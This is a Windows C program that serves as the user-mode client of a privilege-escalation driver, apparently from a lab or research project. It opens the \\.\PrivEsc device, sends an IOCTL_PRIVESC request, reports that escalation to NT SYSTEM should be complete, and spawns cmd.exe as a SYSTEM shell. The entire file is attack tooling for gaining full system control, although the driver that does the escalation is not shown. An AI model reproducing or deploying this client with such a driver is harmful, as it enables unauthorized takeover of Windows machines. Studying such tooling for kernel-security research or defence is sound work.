#include <stdio.h>
#include <Windows.h>
#include "..\PrivEsc\PrivEscCommon.h"

int main() {
    HANDLE hDevice;
    BOOL result;
    DWORD bytesReturned;
    char InputBuffer[128] = { 0 };
    char OutputBuffer[128] = { 0 };

    hDevice = CreateFileW(L"\\\\.\\PrivEsc", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {  // Corrected the condition
        DWORD error = GetLastError();
        printf("Error opening device (%u)\n", error);

        switch (error) {
        case ERROR_ACCESS_DENIED:
            printf("Access denied. Try running as Administrator.\n");
            break;
        case ERROR_FILE_NOT_FOUND:
            printf("Device not found. Ensure the driver is running.\n");
            break;
        default:
            printf("Unknown error occurred while opening the device.\n");
            break;
        }
        return 1;
    }

    printf("Device opened successfully!\n");

    result = DeviceIoControl(hDevice, IOCTL_PRIVESC, InputBuffer, sizeof(InputBuffer),
        OutputBuffer, sizeof(OutputBuffer), &bytesReturned, NULL);

    if (!result) {
        DWORD error = GetLastError();
        printf("Error sending IOCTL: %lu\n", error);

        switch (error) {
        case ERROR_ACCESS_DENIED:
            printf("Permission denied. Run with Administrator privileges.\n");
            break;
        case ERROR_INVALID_PARAMETER:
            printf("Incorrect parameters sent to the IOCTL.\n");
            break;
        case ERROR_FILE_NOT_FOUND:
            printf("Device not found.\n");
            break;
        default:
            printf("An unknown error occurred.\n");
            break;
        }

        CloseHandle(hDevice);
        return 1;
    }

    printf("Successfully sent IOCTL. Privilege escalation to NT SYSTEM should be complete.\n");

    printf("Opening SYSTEM shell...\n");
    system("cmd.exe");  // Blocking call to open cmd.exe with elevated privileges

    CloseHandle(hDevice);

    return 0;
}
